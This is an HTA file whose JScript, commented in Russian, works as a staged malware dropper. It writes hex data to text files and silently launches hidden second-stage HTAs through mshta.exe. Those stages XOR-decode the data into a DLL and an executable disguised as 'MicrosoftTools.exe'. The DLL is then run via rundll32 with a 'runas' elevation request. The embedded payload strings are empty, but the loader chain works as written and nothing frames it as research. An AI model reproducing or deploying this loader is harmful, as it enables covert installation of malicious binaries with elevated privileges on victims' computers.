<html>
<head>
<hta:application />

<script>

try {

       var hex = "";
       
       var fso =
        new ActiveXObject(
            "Scripting.FileSystemObject"
        );

    // --- out.txt ---
    var file =
        fso.CreateTextFile(
            "D:\\PYTHON\\C\\dll\\mshta\\out.txt",
            true
        );
    file.Write(hex);

    file.Close();

// --- создаём новый HTA ---
    var htaPath =
        "D:\\PYTHON\\C\\dll\\mshta\\second.hta";

    var hta =
        fso.CreateTextFile(
            htaPath,
            true
        );

    hta.Write(
        '<html>' +
        '<head>' +
        '<hta:application caption="no" showintaskbar="no">' +
        '<script>' +
        
        
        
        //'alert("SECOND HTA STARTED");' +
        //'close();' +
        
        'try {' +

    'var stream = new ActiveXObject("ADODB.Stream");'+

    'stream.Type = 2;'+
    'stream.Charset = "utf-8";'+

    'stream.Open();'+

    'stream.LoadFromFile("D:\\\\PYTHON\\\\C\\\\dll\\\\mshta\\\\out.txt");'+

    'var hex = stream.ReadText();'+

    'stream.Close();'+

    'var key = 123;'+

    'hex = hex.replace(/\\s/g, "");'+

    'var text = "";'+

    'for (var i = 0; i < hex.length; i += 2) {'+

        'var b = parseInt(hex.substr(i, 2), 16);'+

        'if (isNaN(b)) continue;'+

        'b = (b ^ key) & 0xFF;'+

        'text += String.fromCharCode(b);'+
    '}'+

    'var outStream = new ActiveXObject("ADODB.Stream");'+

    'outStream.Type = 2;'+
    'outStream.Charset = "iso-8859-1";'+

    'outStream.Open();'+

    'outStream.WriteText(text);'+

    'outStream.Position = 0;'+
    'outStream.Type = 1;'+

    'outStream.SaveToFile("D:\\\\PYTHON\\\\C\\\\dll\\\\mshta\\\\mydll.dll",2);'+

    'outStream.Close();'+

   // 'alert("OK");'+
    'window.close();'+

     '} catch(e) {'+

    'alert(e.message);'+
  '}'+  
        
        
        '<\/script>' +
        '</head>' +
        '<body></body>' +
        '</html>'
    );

    hta.Close();

    try {

       var hex = "";
    
    var fso =
        new ActiveXObject(
            "Scripting.FileSystemObject"
        );

    // --- out2.txt ---
    var file =
        fso.CreateTextFile(
            "D:\\PYTHON\\C\\dll\\mshta\\out2.txt",
            true
        );
    file.Write(hex);

    file.Close();
    
    
    
// --- запуск HTA second ---
    var shell =
        new ActiveXObject(
            "WScript.Shell"
        );

    shell.Run(
        'mshta.exe "' + htaPath + '"',
        0,
        false
    );

    //alert("OK DLL");

} catch(e) {

    alert(e.message);

}

// --- создаём новый HTA second2---
    var htaPath =
        "D:\\PYTHON\\C\\dll\\mshta\\second2.hta";

    var hta =
        fso.CreateTextFile(
            htaPath,
            true
        );

    hta.Write(
        '<html>' +
        '<head>' +
        '<hta:application caption="no" showintaskbar="no">' +
        '<script>' +
        
        
        
        //'alert("SECOND HTA STARTED");' +
        //'close();' +
        
        'try {' +

    'var stream = new ActiveXObject("ADODB.Stream");'+

    'stream.Type = 2;'+
    'stream.Charset = "utf-8";'+

    'stream.Open();'+

    'stream.LoadFromFile("D:\\\\PYTHON\\\\C\\\\dll\\\\mshta\\\\out2.txt");'+

    'var hex = stream.ReadText();'+

    'stream.Close();'+

    'var key = 123;'+

    'hex = hex.replace(/\\s/g, "");'+

    'var text = "";'+

    'for (var i = 0; i < hex.length; i += 2) {'+

        'var b = parseInt(hex.substr(i, 2), 16);'+

        'if (isNaN(b)) continue;'+

        'b = (b ^ key) & 0xFF;'+

        'text += String.fromCharCode(b);'+
    '}'+

    'var outStream = new ActiveXObject("ADODB.Stream");'+

    'outStream.Type = 2;'+
    'outStream.Charset = "iso-8859-1";'+

    'outStream.Open();'+

    'outStream.WriteText(text);'+

    'outStream.Position = 0;'+
    'outStream.Type = 1;'+

    'outStream.SaveToFile("D:\\\\PYTHON\\\\C\\\\dll\\\\mshta\\\\MicrosoftTools.exe",2);'+

    'outStream.Close();'+

   // 'alert("OK");'+
    'window.close();'+

     '} catch(e) {'+

    'alert(e.message);'+
  '}'+  
        
        
        '<\/script>' +
        '</head>' +
        '<body></body>' +
        '</html>'
    );

    hta.Close();
    
     
    // --- запуск HTA ---
    var shell =
        new ActiveXObject(
            "WScript.Shell"
        );

    shell.Run(
        'mshta.exe "' + htaPath + '"',
        0,
        false
    );

    //alert("OK DLL");

} catch(e) {

    alert(e.message);

}


var shell = new ActiveXObject("Shell.Application");

shell.ShellExecute(
    "rundll32.exe",
    '"D:\\PYTHON\\C\\dll\\mshta\\mydll.dll",RunMyApp',
    "",
    "runas",
    1
);

 //alert("HY MicrosotTools !!!");
    close();



</script>

</head>

